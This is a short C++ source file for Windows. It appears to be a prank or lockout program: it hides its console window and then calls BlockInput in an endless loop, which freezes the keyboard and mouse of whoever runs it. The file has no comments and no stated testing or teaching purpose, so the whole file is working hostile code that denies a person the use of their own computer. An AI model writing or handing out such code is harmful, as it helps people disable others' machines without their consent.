#include <windows.h>

using namespace std;

int main()
{
	FreeConsole();
	
	while(true)
	{
		BlockInput(true);
	}
	
	return 0;
}